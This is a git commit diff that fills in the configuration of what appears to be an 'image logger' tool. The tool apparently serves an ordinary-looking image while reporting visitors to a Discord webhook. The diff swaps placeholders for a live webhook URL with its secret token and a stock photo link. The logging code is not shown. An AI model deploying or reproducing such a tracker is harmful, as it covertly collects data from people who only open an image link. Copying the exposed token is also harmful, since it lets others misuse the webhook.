72b99c84620310c7b39fe3a178da436ca0f47718
samko132 <lhotskysamik@gmail.com>
2025-02-22 10:48:45 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1342794580629917796/-cj-ADGT2NZnzPDzxm3dxt8yE6ua1lth1QmjiGhtqWqR7OKOOfncsZEe4YtN8DbcfhHO",
+    "image": "https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8189.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
